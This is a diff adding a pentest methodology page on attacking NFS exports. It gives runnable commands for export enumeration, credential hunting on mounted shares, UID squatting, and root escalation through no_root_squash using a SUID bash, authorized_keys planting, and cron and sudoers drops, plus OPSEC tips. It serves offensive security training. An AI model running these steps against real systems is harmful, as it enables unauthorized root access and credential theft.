@@ -1,0 +1,330 @@
+---
+title: NFS - Ports 111(UDP/TCP), 2049
+description: Enumeration and attack methodology for NFS (ports 111 and 2049), covering export discovery, UID squatting, no_root_squash root escalation, and credential pillaging.
+openGraph:
+  title: "NFS - Ports 111(UDP/TCP), 2049"
+  description: "Enumeration and attack methodology for NFS (ports 111 and 2049), covering export discovery, UID squatting, no_root_squash root escalation, and credential pillaging."
+  images:
+    - url: /imgs/nfs.jpg
+      width: 1672
+      height: 941
+      alt: NFS - Ports 111(UDP/TCP), 2049
+      type: image/jpeg
+twitter:
+  card: summary_large_image
+  title: "NFS - Ports 111(UDP/TCP), 2049"
+  description: "Enumeration and attack methodology for NFS (ports 111 and 2049), covering export discovery, UID squatting, no_root_squash root escalation, and credential pillaging."
+  images:
+    - url: /imgs/nfs.jpg
+      width: 1672
+      height: 941
+      alt: NFS - Ports 111(UDP/TCP), 2049
+      type: image/jpeg
+---
+
+# NFS - Ports 111, 2049
+
+import { Callout } from 'nextra/components'
+
+
+## Cheatsheet
+
+```bash
+nmap -sV -sC -p111,2049 <IP>
+sudo nmap --script "nfs*" -p111,2049 <IP>
+
+#interact 
+showmount -e <IP>   # List exports and the hosts/subnets allowed to mount them
+showemount -d <IP> # dirs 
+rpcinfo -p <IP>   # RPC lists all the rpc sercvices like nfs,portmapper,mountd on the server 
+nxc nfs <IP> --shares
+
+# mount
+mkdir -p /mnt/target-nfs
+sudo mount -t nfs <IP>:/<SHARE> /mnt/target-nfs 
+sudo mount -t nfs <IP>:/<SHARE> /mnt/target-nfs -o nolock # wihtout root squashing
+sudo mount -t nfs <IP>:/<SHARE> /mnt/target-nfs -o vers=<version> # force nfsv3/nfsv2..
+ls -lan /mnt/target-nfs/
+# List files with numeric UIDs/GIDs (critical for UID squatting)
+ls -lan /mnt/nfs/
+
+# NetExec recursive export enumeration
+nxc nfs <IP> --enum-shares --enum-depth 3
+nxc nfs <IP> --ls --share <SHARE> #list
+nxc nfs <IP> --get-file <REMOTE> <LOCAL> --share <SHARE> #download
+nxc nfs <IP> --put-file <LOCAL> <REMOTE> --share <SHARE> #upload
+
+sudo umount /mnt/nfs
+```
+
+## Methodology
+
+### Phase 1: Enumerate Exports
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - What exports exist, and which hosts or subnets are allowed to mount each one?
+  - Which NFS versions will the server negotiate, and is `showmount` disabled?
+  - Does the portmapper reveal other RPC services worth investigating?
+  - For each export, can I mount from where I am, or do I need to pivot onto an allowed subnet/host?
+  - Does any export already flag a root-escape or writable condition?
+</Callout>
+
+```bash
+# All NFS scripts 
+sudo nmap --script "nfs*" -p111,2049 <IP>
+showmount -e <IP>
+# RPC program/version/port map
+rpcinfo -p <IP>
+# NetExec share list with permission + root-escape flags
+nxc nfs <IP> --shares
+```
+
+- [ ] `showmount -e <IP>` lists every exported path and the hosts/subnets allowed to mount it. This is the single most important NFS command.
+- [ ] `sudo nmap --script "nfs*" -p111,2049 <IP>` runs `nfs-showmount`, `nfs-ls`, and `nfs-statfs`. `nfs-ls` enumerates file contents and permissions without mounting, so you get a listing even when your UID cannot mount.
+- [ ] `rpcinfo -p <IP>` lists every registered RPC program (portmapper, nfs, mountd, nlockmgr, status). Confirms negotiable NFS versions and reveals auxiliary services.
+- [ ] `nxc nfs <IP> --shares` lists shares with read/write flags and surfaces root-escape conditions automatically.
+- [ ] Parse the allowed-host column for each export and decide your access plan: `*` / `0.0.0.0/0` is world-mountable; a specific subnet means you must be on it or pivot; a single host means you must compromise or pivot through that host first.
+
+<Callout type="info">
+Some hardened servers disable mountd's `showmount` protocol while still serving NFS. If `showmount -e` hangs or returns empty but port 2049 is open, fall back to `sudo nmap --script nfs-showmount,nfs-ls -p111,2049 <IP>` it queries the NFS server directly rather than asking mountd to list exports, and often succeeds where `showmount` fails.
+</Callout>
+
+### Phase 2: Mount and Explore
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Which NFS version mounts cleanly, and does `nolock` avoid the lock-daemon hang?
+  - What are the numeric UIDs/GIDs of files and directories (needed for Phase 4)?
+  - Are there SSH keys, dotfile configs, history files, backups, or database dumps?
+  - Which usernames does the directory layout reveal for later spraying?
+  - Which files am I blocked from reading, and which UID owns them?
+</Callout>
+
+```bash
+# Mount (NFSv3, skip lockd which is often filtered)
+sudo mount -t nfs <IP>:/<SHARE> /mnt/nfs -o nolock
+# Force older version if "Protocol not supported"
+sudo mount -t nfs -o vers=3 <IP>:/<SHARE> /mnt/nfs
+# Numeric UID/GID listing record these before anything else
+ls -lan /mnt/nfs/
+# Hunt the usual suspects
+find /mnt/nfs -name "id_rsa" -o -name "id_ed25519" -o -name "authorized_keys" -o -name "*.pem" 2>/dev/null
+grep -riE "password|passwd|secret|api[_-]?key|token" /mnt/nfs/ 2>/dev/null
+```
+
+- [ ] `sudo mount -t nfs <IP>:/<SHARE> /mnt/nfs -o nolock` `nolock` skips the network lock manager, which is often filtered or broken and otherwise causes hangs.
+- [ ] On `Protocol not supported`, force an older dialect: `sudo mount -t nfs -o vers=3 <IP>:/<SHARE> /mnt/nfs` (or `vers=2`). Legacy NFSv2/v3 are still common on appliances.
+- [ ] `ls -lan /mnt/nfs/` the `-n` flag shows numeric UIDs/GIDs instead of resolved names. You need the raw numbers for UID squatting in Phase 4.
+- [ ] `find /mnt/nfs -type f 2>/dev/null` then targeted searches: SSH material (`id_rsa`, `id_ed25519`, `*.pem`, `authorized_keys`), configs with creds (`*.conf`, `*.env`, `.my.cnf`, `.pgpass`), history (`.bash_history`, `.zsh_history`), backups (`*.bak`, `*.tar*`, `*.sql`).
+- [ ] `grep -riE "password|passwd|secret|api[_-]?key|token" /mnt/nfs/ 2>/dev/null` cast a wide net across everything readable. Prioritise SSH keys first they grant direct shell access to any host that accepts them, not just this one.
+
+
+### Phase 3: Check Write Access
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Can I write to the export at all, and to which subpaths?
+  - What does the writable path map to on the server a home dir, a web root, a cron-watched directory?
+  - Does anything (cron, a watcher service, a backup job) consume files from this share?
+  - Is write access enough on its own, or do I need `no_root_squash` (Phase 5) to make it dangerous?
+</Callout>
+
+```bash
+touch /mnt/nfs/.wtest 2>/dev/null && echo WRITABLE && rm /mnt/nfs/.wtest
+# Cross-check NetExec's writable-share detection
+nxc nfs <IP> --shares
+```
+
+- [ ] `touch /mnt/nfs/.wtest 2>/dev/null && echo WRITABLE && rm /mnt/nfs/.wtest` probe write permission with a disposable marker.
+- [ ] Cross-reference `nxc nfs <IP> --shares`, which flags writable shares explicitly.
+- [ ] If writable, determine what the share maps to: a user's `$HOME` → drop `.ssh/authorized_keys` for instant SSH as that user; a web root (`/var/www/html`, `/srv/http`, `/opt/tomcat/webapps`) → drop a web shell and trigger via HTTP; a shared/logs dir → plant a marker and watch where it surfaces to infer what touches it.
+- [ ] If cron or a watcher service reads the share, hijack a script that runs as root.
+
+### Phase 4: UID Squatting (Access Restricted Files)
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Which numeric UID/GID owns the files I cannot currently read or write?
+  - Is `all_squash` set (which would defeat this technique)?
+  - After matching the UID locally, can I read, write, and chmod the target files?
+  - Which other UIDs are worth impersonating on this same export?
+</Callout>
+
+```bash
+# Identify the owning UID
+ls -lan /mnt/nfs/
+# Create a local user with the matching UID (-o allows duplicate, -m makes a home)
+sudo useradd -o -u 1001 -m -s /bin/bash squatter
+sudo su - squatter
+cat /mnt/nfs/restricted_file.txt
+```
+
+- [ ] `ls -lan /mnt/nfs/` note the numeric UIDs of files you cannot read or write.
+- [ ] `sudo useradd -o -u 1001 -m -s /bin/bash squatter && sudo su - squatter` match the file owner's UID locally. Under `AUTH_SYS` the server accepts your access as that user, so you can now read, write, and chmod files owned by UID 1001.
+- [ ] For restricted group access, mirror the GID too: `sudo groupadd -g <GID> squattergrp && sudo usermod -aG squattergrp squatter`.
+- [ ] Repeat for any UID whose files you want to touch.
+
+<Callout type="warning">
+**OPSEC / cleanup.** UID squatting leaves local artifacts on your attacker box (`/etc/passwd`, `/etc/shadow`, `/home/squatter`). Tear them down afterwards (`sudo userdel -r squatter`). On the server side, every access is logged with the *client-supplied* UID, so the activity looks like the legitimate user useful for blending in, but it does not hide your source IP, which is still in the logs.
+</Callout>
+
+### Phase 5: Escalate to Root (`no_root_squash` / `no_subtree_check`)
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Is `no_root_squash` set, and does the export map to `/`, `/home`, `/root`, or a narrow subtree?
+  - Do I already have a shell on the target (enables the SUID-binary path) or not (forces the key/cron path)?
+  - Which escalation primitive fits the exposed path: SUID bash, `authorized_keys`, or a cron/sudoers drop?
+  - Does NetExec report `Root escape: Yes`, meaning `no_subtree_check` lets me reach files outside the export?
+  - What evidence proves root authority does a root-created file show `root:root` rather than `nobody:nogroup`?
+</Callout>
+
+```bash
+# Confirm no_root_squash from the server config (needs a shell on target)
+cat /etc/exports
+# SUID bash drop needs a low-priv shell on the target to execute it
+sudo cp /bin/bash /mnt/nfs/.rootbash
+sudo chmod 4755 /mnt/nfs/.rootbash
+# On the target, as the low-priv user:
+# /path/on/target/.rootbash -p     # -p preserves euid -> root shell
+
+# SSH authorized_keys drop no target shell required
+ssh-keygen -t ed25519 -f nfs_key -N ""
+sudo mkdir -p /mnt/nfs/root/.ssh && sudo chmod 700 /mnt/nfs/root/.ssh
+sudo tee /mnt/nfs/root/.ssh/authorized_keys < nfs_key.pub
+sudo chmod 600 /mnt/nfs/root/.ssh/authorized_keys
+ssh -i nfs_key root@<IP>
+
+# Cron / sudoers drop  when the export reaches /etc
+echo '* * * * * root chmod u+s /bin/bash' | sudo tee /mnt/nfs/etc/cron.d/.pwn
+echo 'nobody ALL=(ALL) NOPASSWD:ALL' | sudo tee /mnt/nfs/etc/sudoers.d/.pwn
+
+# no_subtree_check root escape reach inodes outside the exported subtree
+nxc nfs <IP>
+```
+
+- [ ] Confirm the option: with a shell, `cat /etc/exports` and look for `no_root_squash`. Without a shell, mount as root, `touch` a file, and `ls -l` it `root:root` (not `nobody:nogroup`) confirms `no_root_squash`.
+- [ ] **Match the primitive to the exposed path.** An export mapped to `/home` (not `/`) rules out `/etc/cron.d/` and `/root/.ssh/` you can only reach user home directories, so the clean play is dropping your key in `/home/<user>/.ssh/authorized_keys` for every user whose directory exists. A SUID-bash drop is useless there until you already have a foothold to execute it.
+- [ ] **SUID-binary method** (requires a low-priv shell on the target): copy `/bin/bash` into the export, `chmod 4755`, then run it on the target with `-p`. The `-p` is essential without it bash drops privileges when euid ≠ uid.
+- [ ] **SSH `authorized_keys` method** (no target shell needed): write your public key into a writable `/root/.ssh/` or a user's `.ssh/` exposed by the export, then SSH in.
+- [ ] **Cron / sudoers drop** (when the export reaches `/etc`): plant a root cron job or a sudoers file. Only possible if the export root is `/` (or `/etc`) with `no_root_squash`.
+- [ ] **`no_subtree_check` root escape** (fallback when the export is read-only or maps to a boring subtree): `nxc nfs <IP>` flags this as `Root escape: Yes`. The option (the modern default, enabled for performance) means the server does not verify that a submitted file handle lives inside the exported subtree, so a crafted handle can reach `/etc/shadow`, `/root/.ssh/`, or any inode. Use file-handle tooling such as [`libnfs`/`nfs-cat`](https://github.com/sahlberg/libnfs); it is fiddly, so prefer the writable/`no_root_squash` paths first.
+
+
+<Quiz
+  question="You've mounted an NFS export with options `rw,no_root_squash,no_subtree_check` that maps to `/srv/share` on the server. You can write as root but have no shell on the target. The server also runs Apache with DocumentRoot /var/www/html. Which is the highest-value next move?"
+  options={[
+    "Drop a SUID bash binary at /mnt/nfs/.rootbash and wait for a user to run it",
+    "Write through the share to /var/www/html/shell.php via a ../../../var/www/html/ path traversal",
+    "Use the no_subtree_check root escape to reach /root/.ssh/authorized_keys and SSH in as root",
+    "Drop an SSH key in every /home/*/.ssh/authorized_keys you can find on the share"
+  ]}
+  answer={2}
+  explanation="The share maps to /srv/share, so options A and D are impossible there are no /home/ or /root/ directories inside /srv/share to target, and the SUID drop is useless without a foothold to execute it. Path traversal in the mount (B) does not work: NFS resolves paths on the server, so '..' normally stays within the export's subtree. no_subtree_check (C) is exactly what relaxes that guarantee it lets you construct file handles for inodes outside the exported subtree. Combined with no_root_squash (root authority server-side), this is the one technique that can actually reach /root/.ssh/ from this export. It is fiddly but it is the only viable path given the constraints."
+/>
+
+## Overview
+
+NFS (Network File System) is the native Unix/Linux file-sharing protocol the equivalent of SMB in the Windows world. It is used heavily on storage appliances, VMware datastores, Kubernetes persistent volumes, and shared home-directory servers.
+
+| Version | Authentication | Notes |
+|---------|----------------|-------|
+| NFSv2 | `AUTH_SYS` (client-supplied UID) | Legacy. 2 GiB file-size limit. Rare on modern systems but present on appliances. |
+| NFSv3 | `AUTH_SYS` by default | The most commonly exploited version. No per-user auth the client tells the server which UID to use. |
+| NFSv4 | `AUTH_SYS` by default, `RPCSEC_GSS` / Kerberos optional | Adds ACLs, delegation, compound ops. Kerberos (`sec=krb5`) exists but is rarely configured most NFSv4 still runs AUTH_SYS and is as exploitable as v3. |
+| NFSv4.1 / 4.2 | Same as v4 | Adds pNFS, server-side copy, I/O hints. Same trust model. |
+
+**Ports:**
+
+- `111/TCP/UDP` RPCbind / Portmapper (maps RPC programs to dynamic ports). Used by NFSv3 and below; NFSv4 does not require it.
+- `2049/TCP/UDP` the NFS service itself.
+
+<Callout type="info">
+The single most important fact about NFS exploitation: under `AUTH_SYS` the server trusts the UID the client sends. There is no challenge, no password, no certificate. If your client user is UID 1001, the server treats you as whatever local user owns UID 1001 on the server. This is why UID squatting works, why `no_root_squash` is catastrophic, and why `all_squash` exists as a mitigation. NFSv4 fixes this only when Kerberos is explicitly configured, which almost never happens outside tightly-managed enterprise fleets.
+</Callout>
+
+## Quick Reference
+
+| Task | Command |
+|------|---------|
+| List exports | `showmount -e <IP>` |
+| RPC services | `rpcinfo -p <IP>` |
+| Nmap full sweep | `sudo nmap --script "nfs*" -p111,2049 <IP>` |
+| NetExec shares | `nxc nfs <IP> --shares` |
+| Mount (v3, no lockd) | `sudo mount -t nfs <IP>:/<SHARE> /mnt/nfs -o nolock` |
+| Force version | `sudo mount -t nfs -o vers=3 <IP>:/<SHARE> /mnt/nfs` |
+| Unmount | `sudo umount /mnt/nfs` |
+| List with numeric UIDs | `ls -lan /mnt/nfs/` |
+| Download via nxc | `nxc nfs <IP> --get-file <REMOTE> <LOCAL> --share <SHARE>` |
+| Upload via nxc | `nxc nfs <IP> --put-file <LOCAL> <REMOTE> --share <SHARE>` |
+
+## NFS Export Options
+
+**Config file:** `/etc/exports` on the server. Each line is `path client(options)`, e.g. `/srv/share 10.10.10.0/24(rw,no_root_squash)`.
+
+| Option | Description |
+|--------|-------------|
+| `rw` | Read-write access |
+| `ro` | Read-only access |
+| `sync` | Synchronous writes (safer, slower) |
+| `async` | Asynchronous writes (faster, risks corruption on crash) |
+| `root_squash` | Maps client UID 0 to `nobody` (default, secure) |
+| `no_root_squash` | Client root = server root  catastrophic if combined with `rw` |
+| `all_squash` | Maps every client UID to `nobody` defeats UID squatting |
+| `no_all_squash` | UIDs pass through unchanged (default) |
+| `subtree_check` | Validates that requested inodes live inside the exported subtree (safer) |
+| `no_subtree_check` | Skips that validation (default for performance, enables root escape) |
+| `secure` | Requires source port < 1024 |
+| `insecure` | Accepts any source port |
+| `anonuid`, `anongid` | UID/GID used when squashing useful for directed drops |
+
+### Dangerous Settings Cheat-Sheet
+
+| Setting | Why it's a jackpot |
+|---------|-------------------|
+| `rw,no_root_squash` | Trivial root via SUID binary, SSH key drop, or cron/sudoers injection |
+| `rw,*` (or wide subnet) | Any client in scope can write  credential plant, web shell, authorized_keys drop |
+| `insecure` | Lets unprivileged users on the client mount/write without local root |
+| `no_subtree_check` | Root escape access files outside the exported subtree |
+| `sec=sys` (the v4 default) | Confirms AUTH_SYS UID squatting applies |
+
+## Nmap Scripts
+
+```bash
+sudo nmap --script "nfs*" -p111,2049 <IP>
+nmap --script nfs-showmount -p111,2049 <IP>   # like showmount -e, works when showmount is filtered
+nmap --script nfs-ls -p111,2049 <IP>          # list exports AND file contents, no mount required
+nmap --script nfs-statfs -p111,2049 <IP>      # disk statistics per export
+nmap --script rpcinfo -p111 <IP>              # list all registered RPC programs
+```
+
+## NetExec (nxc)
+
+```bash
+nxc nfs <IP> --shares
+
+# Recursive enumeration
+nxc nfs <IP> --enum-shares
+nxc nfs <IP> --enum-shares --enum-depth 3
+
+# List files in a specific share
+nxc nfs <IP> --ls --share <SHARE>
+
+# Download / upload
+nxc nfs <IP> --get-file <REMOTE> <LOCAL> --share <SHARE>
+nxc nfs <IP> --put-file <LOCAL> <REMOTE> --share <SHARE>
+```
+
+<Callout type="info">
+NetExec's NFS module tests for the `no_subtree_check` root escape automatically and surfaces it as `Root escape: Yes`. If you see it, work the `no_subtree_check` step in Phase 5 you may be able to reach `/etc/shadow`, `/root/.ssh/`, or any other filesystem location from within the mount.
+</Callout>
+
+<div className="flex flex-wrap gap-2 mb-4">
+  #pentest #redteam #certification #nfs #linux
+</div>
